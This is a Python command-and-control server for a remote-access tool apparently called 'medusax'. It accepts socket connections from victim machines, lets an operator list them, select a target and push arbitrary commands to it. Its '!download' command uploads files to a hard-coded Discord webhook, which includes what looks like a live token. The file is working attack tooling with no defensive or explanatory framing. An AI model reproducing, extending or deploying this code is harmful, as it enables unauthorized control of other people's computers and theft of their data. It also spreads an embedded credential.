import os
import socket
import threading
import sys
from flask import Flask, render_template
import requests

# Flask Web App
app = Flask(__name__)

clients = {}
selected_client = None
streaming_enabled = False

server_ip = "0.0.0.0"
server_port = 9999
webhook_url = "https://discord.com/api/webhooks/1321414956754931723/RgRsAM3bM5BALj8dWBagKeXwoNHEWnROLihqu21jyG58KiKfD9KNxQKOTCDVhL5J_BC2"

def handle_client_connection(client_socket, client_address):
    global selected_client
    client_ip = client_address[0]
    clients[client_ip] = client_socket
    print(f"[+] New connection from {client_ip}")

def start_streaming():
    global streaming_enabled
    if not streaming_enabled:
        streaming_enabled = True
        print("[+] Streaming started.")
    else:
        print("[-] Streaming already active.")

def list_clients():
    print("[*] Connected clients:")
    for client in clients:
        status = "(selected)" if client == selected_client else ""
        print(f"[+] {client} {status}")

def set_target(target_ip):
    global selected_client
    if target_ip in clients:
        selected_client = target_ip
        print(f"[*] Target set to {target_ip}")
    else:
        print("[-] Invalid target IP.")

def remove_target(target_ip):
    global selected_client
    if target_ip == selected_client:
        selected_client = None
        print(f"[*] Target removed: {target_ip}")
    else:
        print("[-] Target not found.")

def download_file(file_path):
    print(f"[*] Sending file {file_path} to Discord Webhook...")
    if os.path.exists(file_path):
        with open(file_path, 'rb') as f:
            requests.post(webhook_url, files={"file": f})
            print("[+] Sent!")
    else:
        print("[-] File not found.")

# Flask Web Interface (Activate with !stream)
@app.route('/')
def index():
    return render_template('index.html')

def run_flask():
    app.run(host="0.0.0.0", port=5000)

# Command-Line Interface with Prompt
def command_line():
    global selected_client
    while True:
        if clients:
            command = input("medusax > ")
            if command == "!list":
                list_clients()
            elif command.startswith("!set target"):
                set_target(command.split(" ")[2])
            elif command.startswith("!remove target"):
                remove_target(command.split(" ")[2])
            elif command == "!stream":
                start_streaming()
            elif command.startswith("!download"):
                file_path = command.split(" ")[1]
                download_file(file_path)
            else:
                if selected_client:
                    clients[selected_client].send(command.encode("utf-8"))
                else:
                    print("[-] No target selected.")
        else:
            continue

# Start Server and CLI
def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((server_ip, server_port))
    server.listen(5)
    print(f"[+] Server started on {server_ip}:{server_port}")

    threading.Thread(target=run_flask, daemon=True).start()
    threading.Thread(target=command_line, daemon=True).start()

    while True:
        client_socket, client_address = server.accept()
        threading.Thread(target=handle_client_connection, args=(client_socket, client_address), daemon=True).start()

if __name__ == '__main__':
    start_server()
